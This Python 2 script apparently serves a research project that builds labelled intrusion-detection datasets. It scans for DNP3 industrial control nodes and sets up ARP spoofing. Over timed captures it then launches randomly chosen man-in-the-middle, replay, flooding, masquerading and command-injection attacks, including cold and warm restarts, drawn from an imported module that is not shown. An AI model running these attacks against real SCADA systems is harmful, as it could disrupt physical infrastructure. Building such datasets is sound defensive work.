__author__ = 'Nicholas Rodofile'

from attack_functions import *
import datetime
from shutil import copyfile



local = "dataset/"
interface = 'eth0'
directory = local + str(datetime.datetime.now().strftime("%Y%m%d%H%M%S"))
os.makedirs(directory)

subprocess.call("./networkrestart_attacker.sh")

minute = 60
hour = (60 * minute)
service_time = 1.0 * minute

log = []
sub_log = []

def timestamp_log(log_msg):
    log_item = str(datetime.datetime.now()) + " " +log_msg
    print log_item
    log.append(log_item)
    sub_log.append(log_item)


def run_attack(_victim, _gateway, attack):
    timestamp_log(attack.__name__ + " " + _victim.ip_address + " " + _gateway.ip_address + " START")
    attack(_victim, _gateway)
    timestamp_log(attack.__name__ + " " + _victim.ip_address + " " + _gateway.ip_address + " END")

def reconnaissance(mitm):
    timestamp_log("nmap START")
    nodes = scan_for_all_hosts(interface="eth0", port="20000", init_nodes_func=init_dnp3_nodes)
    timestamp_log("nmap END")
    scan_countdown(10)
    DNP3_nodes_found = []
    for n in nodes.keys():
        if nodes[n].status == "open":
            mitm.gateway = nodes[n]
            mitm.init_spoofing()
            timestamp_log("reconnaissance" + " " + nodes[n].ip_address + " START")
            master = DNP3_Reconnaissance(nodes[n], dnp3_port)
            DNP = master.start()
            DNP3_nodes_found.append(DNP), "Address discovery"
            timestamp_log("reconnaissance" + " " + nodes[n].ip_address + " END")
        else:
            print n, "port closed"

    print "--------------- DNP3 Nodes Found ----------------"
    print "#################################################"
    if len(DNP3_nodes_found) == 0:
        print "No DNP3 Nodes"
    for n_d in DNP3_nodes_found:
        print n_d["IP"], ": Master:", n_d["master"], " Slave:", n_d["slave"]
    print "#################################################"

replay_file = 'mitm/replay_20160225_1634.pcap'
mst_replay_file = 'mitm/20160226-1656_sample_DNP3_for_replay.pcap'
mst_replay_file2 = 'mitm/20160226-1656_sample_DNP3_for_replay.pcap'


datasets = [
    "training",
    "testing",

]
capture_time = 24
frequencies = {
    # "testing_set": {
    #     "capture_time": capture_time,
    #     "min_time": 1 * minute,
    #     "max_time": 1 * minute,
    # },

    "frequent": {
        "capture_time": capture_time,
        "min_time": 10 * minute,
        "max_time": 30 * minute,
    },

    "infrequent": {
        "capture_time": capture_time,
        "min_time": 60 * minute,
        "max_time": 180 * minute,
    },
}

attack_class_names = [
    # "MITM",
    # "replay",
    # "flooding",
    "masquerading",
    # "injection",
    # "attacks"
]
attack_classes = {

    "injection": [
        injection_replay,
        injection_replay_updaterAck,
        injection_FreezeObj,
        injection_ColdRestart,
        injection_WarmRestart,
        injection_push,
    ],
    "masquerading": [
        master_masquerading,
        master_hijacking_masquerading,
        slave_masquerading,
        slave_masquerading_flooding,
        slave_masquerading_ObjectSpoofBinary,
        slave_masquerading_ObjectSpoofCounter,
        slave_masquerading_ObjectSpoofBinaryFuzz,
        slave_masquerading_ObjectSpoofCounterFuzz
    ],
    "flooding": [
        master_flooding,
        slave_masquerading_flooding,
        master_replay_flooding,
        master_hijacking_replay_flooding,
        master_flooding_freeze,
        master_flooding_time,
    ],
    "replay": [
        master_replay,
        master_replay_flooding,
        master_hijacking_replay,
        injection_replay,
        injection_replay_updaterAck,
    ],

    "MITM": [
        MITM_forwarding,
        MITM_hijack_injection,
        MITM_modification_ImmedFreezeNR,
        MITM_modification_BinaryStatus,
        MITM_modification_CounterStatus,
        MITM_modification_BinaryInputPointDelete,
        MITM_modification_BinaryInputDataDelete,
        MITM_modification_BinaryInputPointInsert,
        MITM_modification_CountBinaryInputPointInsert
    ],
    "attacks": [
        injection_replay,
        injection_replay_updaterAck,
        injection_FreezeObj,
        injection_ColdRestart,
        injection_WarmRestart,
        injection_push,
        master_masquerading,
        master_hijacking_masquerading,
        slave_masquerading,
        slave_masquerading_flooding,
        slave_masquerading_ObjectSpoofBinary,
        slave_masquerading_ObjectSpoofCounter,
        slave_masquerading_ObjectSpoofBinaryFuzz,
        slave_masquerading_ObjectSpoofCounterFuzz,
        master_flooding,
        master_replay_flooding,
        master_hijacking_replay_flooding,
        master_flooding_freeze,
        master_flooding_time,
        master_replay,
        master_hijacking_replay,
        MITM_forwarding,
        MITM_hijack_injection,
        MITM_modification_ImmedFreezeNR,
        MITM_modification_BinaryStatus,
        MITM_modification_CounterStatus,
        MITM_modification_BinaryInputPointDelete,
        MITM_modification_BinaryInputDataDelete,
        MITM_modification_BinaryInputPointInsert,
        MITM_modification_CountBinaryInputPointInsert
    ]
}


verbose = 1
pkt_count = 100

interfaces = {
    'attacker': "eth0",
    'master': "eth1",
    'slave': "eth2"
}

print "Dataset:", directory
print "Datasets Types"
for d in datasets:
    print "\t-", d

print "Datasets Frequencies"
for f in frequencies:
    print "\t-", f
    print "\t\t-- capture time:", frequencies[f]["capture_time"], "hours"
    print "\t\t-- min_time:", frequencies[f]["min_time"], "seconds"
    print "\t\t-- max_time:", frequencies[f]["max_time"], "seconds"

print "Attack Classes"
for ac in attack_class_names:
    print "\t-", ac
    for a in attack_classes[ac]:
        print "\t\t--", a.__name__


gateway, victim, nodes = config_nodes_all(interface=interface, port="20000", init_nodes_func=init_dnp3_nodes)
mitm = DNP3_MITM(interface_selected=interface, gateway=gateway, victim=victim, verbose=verbose, pkt_count=pkt_count)
mitm.init_spoofing()


count = 0
udp = UDP_Server(gateway, 23, 0)
udp_mask = Thread(target=udp.start)
udp_mask.daemon = True
udp_mask.start()

for attack_class in attack_class_names:
    attack_class_dir = directory+"/"+attack_class
    os.makedirs(attack_class_dir)
    print "--", attack_class
    for dataset in datasets:
        attack_class_ds_dir = attack_class_dir+"/"+dataset
        os.makedirs(attack_class_ds_dir)
        print "----", dataset
        for frequency in frequencies:
            frequency_attack_class_dir = attack_class_ds_dir+"/"+frequency
            os.makedirs(frequency_attack_class_dir)
            print "------", frequency
            count += 1

            attack_list = attack_classes[attack_class]
            capture_time_ = frequencies[frequency]['capture_time']
            min_time = frequencies[frequency]['min_time']
            max_time = frequencies[frequency]['max_time']

            experiment_name = "Dataset"
            dataset_manager = DatasetManager(frequency_attack_class_dir, interfaces, experiment_name)

            start_time = datetime.datetime.now()
            end_time = start_time + datetime.timedelta(hours=capture_time_)
            #end_time = start_time + datetime.timedelta(minutes=capture_time_)


            print start_time, "Start Time"
            print end_time, "End Time (Approx)"

            dataset_manager.start()
            # Randomise time
            attack_countdown(randint(min_time, max_time))
            reconnaissance(mitm)

            attack_counter = 0

            while (datetime.datetime.now() < end_time) and \
                    (end_time > (datetime.datetime.now() + datetime.timedelta(seconds=max_time))):
                sleep_time = (randint(min_time, max_time))
                attack_countdown(sleep_time)
                shuffle(attack_list)
                attack = attack_list[randint(0, (len(attack_list)-1))]
                run_attack(victim, gateway, attack)
                attack_counter += 1
            print "Number of attacks:", attack_counter
            print datetime.datetime.now(), "Time now"
            count_down = (end_time - datetime.datetime.now()).total_seconds()
            if count_down > 0:
                print count_down
                ending_dataset(int(count_down))

            dataset_manager.stop()
            sub_log_file = frequency_attack_class_dir+"/Attack_script_log.log"
            file = open(sub_log_file, 'w')
            for l in sub_log:
                file.write(l + "\n")
            file.close()
            print "Sub-Log file:", sub_log_file
            sub_log = []

UDP_SERVER_STOP = True
log_file = directory+"/Attack_script_log.log"
file = open(log_file, 'w')
for l in log:
    file.write(l + "\n")
file.close()

print "Log file:", log_file
copyfile('/root/DNP3_MITM_Lib 2/DNP3_MITM_Lib/output/console', directory+"/Attack_script_output.txt")

